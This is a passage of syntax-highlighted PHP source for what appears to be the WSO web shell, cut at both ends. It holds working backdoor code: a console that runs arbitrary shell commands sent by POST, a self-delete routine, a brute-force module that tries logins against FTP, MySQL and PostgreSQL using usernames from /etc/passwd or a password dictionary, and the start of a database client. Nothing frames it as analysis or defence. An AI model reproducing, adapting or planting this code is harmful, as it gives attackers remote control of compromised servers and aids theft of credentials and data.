    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/select&amp;gt;&amp;lt;input type=button onclick=&quot;add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}&quot; value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt; &amp;lt;input type=checkbox name=ajax value=1 &#39;</span><span class="o">.</span><span class="p">(</span><span class="o">@</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;checked&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;gt; send using AJAX&amp;lt;br/&amp;gt;&amp;lt;textarea class=bigarea name=output style=&quot;border-bottom:0;margin:0;&quot; readonly&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="s2">&quot;$ &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">wsoEx</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/textarea&amp;gt;&amp;lt;input type=text name=cmd style=&quot;border-top:0;width:100%;margin:0;&quot; onkeydown=&quot;kp(event);&quot;&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/form&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;script&amp;gt;document.cf.cmd.focus();&amp;lt;/script&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">actionLogout</span><span class="p">()</span> <span class="p">{</span>
    <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])]);</span>
    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!&#39;</span><span class="p">);</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">actionSelfRemove</span><span class="p">()</span> <span class="p">{</span>
 
    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;yes&#39;</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!\(\d+\)\s.*!&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="k">__FILE__</span><span class="p">)))</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Shell has been removed&#39;</span><span class="p">);</span>
        <span class="k">else</span>
            <span class="k">echo</span> <span class="s1">&#39;unlink error!&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;yes&#39;</span><span class="p">)</span>
        <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;Suicide&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;Really want to remove the shell?&amp;lt;br&amp;gt;&amp;lt;a href=# onclick=&quot;g(null,null,\&#39;yes\&#39;)&quot;&amp;gt;Yes&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">actionBruteforce</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;Results&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&amp;lt;span&amp;gt;Type:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Server:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;server&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;ftp&#39;</span> <span class="p">)</span> <span class="p">{</span>
            <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_connect</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="o">?</span><span class="nv">$port</span><span class="o">:</span><span class="mi">21</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
                <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span>
                <span class="o">@</span><span class="nb">ftp_close</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
                <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;mysql&#39;</span> <span class="p">)</span> <span class="p">{</span>
            <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$ip</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$port</span><span class="o">?</span><span class="nv">$port</span><span class="o">:</span><span class="mi">3306</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span>
                <span class="o">@</span><span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
                <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;pgsql&#39;</span> <span class="p">)</span> <span class="p">{</span>
            <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$str</span> <span class="o">=</span> <span class="s2">&quot;host=&#39;&quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;&#39; port=&#39;&quot;</span><span class="o">.</span><span class="nv">$port</span><span class="o">.</span><span class="s2">&quot;&#39; user=&#39;&quot;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s2">&quot;&#39; password=&#39;&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;&#39; dbname=postgres&quot;</span><span class="p">;</span>
                <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_connect</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
                <span class="o">@</span><span class="nb">pg_close</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
                <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nv">$success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$attempts</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$server</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;server&#39;</span><span class="p">]);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span> <span class="p">)</span>
                <span class="k">foreach</span><span class="p">(</span><span class="nv">$temp</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$line</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span>
                    <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span>
                    <span class="k">if</span><span class="p">(</span> <span class="nx">bruteForce</span><span class="p">(</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$success</span><span class="o">++</span><span class="p">;</span>
                        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;b&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/b&amp;gt;:&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;reverse&#39;</span><span class="p">])</span> <span class="p">{</span>
                        <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
                        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="nv">$i</span><span class="p">)</span>
                            <span class="nv">$tmp</span> <span class="o">.=</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nv">$i</span><span class="p">];</span>
                        <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span>
                        <span class="k">if</span><span class="p">(</span> <span class="nx">bruteForce</span><span class="p">(</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$tmp</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
                            <span class="nv">$success</span><span class="o">++</span><span class="p">;</span>
                            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;b&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/b&amp;gt;:&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dict&#39;</span><span class="p">]);</span>
            <span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span> <span class="p">)</span>
                <span class="k">foreach</span><span class="p">(</span><span class="nv">$temp</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$line</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$line</span><span class="p">);</span>
                    <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span>
                    <span class="k">if</span><span class="p">(</span> <span class="nx">bruteForce</span><span class="p">(</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">],</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$success</span><span class="o">++</span><span class="p">;</span>
                        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;b&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/b&amp;gt;:&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;span&amp;gt;Attempts:&amp;lt;/span&amp;gt; </span><span class="si">$attempts</span><span class="s2"> &amp;lt;span&amp;gt;Success:&amp;lt;/span&amp;gt; </span><span class="si">$success</span><span class="s2">&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;FTP bruteforce&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&amp;lt;table&amp;gt;&amp;lt;form method=post&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span&amp;gt;Type&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;select name=proto&amp;gt;&amp;lt;option value=ftp&amp;gt;FTP&amp;lt;/option&amp;gt;&amp;lt;option value=mysql&amp;gt;MySql&amp;lt;/option&amp;gt;&amp;lt;option value=pgsql&amp;gt;PostgreSql&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;input type=hidden name=c value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;input type=hidden name=a value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;input type=hidden name=charset value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;span&amp;gt;Server:port&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;input type=text name=server value=&quot;127.0.0.1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span&amp;gt;Brute type&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;label&amp;gt;&amp;lt;input type=radio name=type value=&quot;1&quot; checked&amp;gt; /etc/passwd&amp;lt;/label&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;label style=&quot;padding-left:15px&quot;&amp;gt;&amp;lt;input type=checkbox name=reverse value=1 checked&amp;gt; reverse (login -&amp;gt; nigol)&amp;lt;/label&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;label&amp;gt;&amp;lt;input type=radio name=type value=&quot;2&quot;&amp;gt; Dictionary&amp;lt;/label&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;table style=&quot;padding-left:15px&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span&amp;gt;Login&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;input type=text name=login value=&quot;root&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;span&amp;gt;Dictionary&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;input type=text name=dict value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;passwd.dic&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&#39;</span>
        <span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/table&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">actionSql</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">class</span> <span class="nc">DbClass</span> <span class="p">{</span>
        <span class="k">var</span> <span class="nv">$type</span><span class="p">;</span>
        <span class="k">var</span> <span class="nv">$link</span><span class="p">;</span>
        <span class="k">var</span> <span class="nv">$res</span><span class="p">;</span>
        <span class="k">function</span> <span class="nf">DbClass</span><span class="p">(</span><span class="nv">$type</span><span class="p">)</span>    <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">){</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">if</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$user</span><span class="p">,</span><span class="nv">$pass</span><span class="p">,</span><span class="k">true</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="nv">$host</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="nv">$host</span><span class="p">);</span>
                    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="mi">5432</span><span class="p">;</span>
                    <span class="k">if</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_connect</span><span class="p">(</span><span class="s2">&quot;host=</span><span class="si">{</span><span class="nv">$host</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> port=</span><span class="si">{</span><span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2"> user=</span><span class="si">$user</span><span class="s2"> password=</span><span class="si">$pass</span><span class="s2"> dbname=</span><span class="si">$dbname</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">selectdb</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$db</span><span class="p">))</span><span class="k">return</span> <span class="k">true</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">query</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_query</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">fetch</span><span class="p">()</span> <span class="p">{</span>
            <span class="nv">$res</span> <span class="o">=</span> <span class="nb">func_num_args</span><span class="p">()</span><span class="o">?</span><span class="nb">func_get_arg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">:</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span><span class="p">;</span>
            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
                    <span class="k">return</span> <span class="o">@</span><span class="nb">pg_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="nf">listDbs</span><span class="p">()</span> <span class="p">{</span>
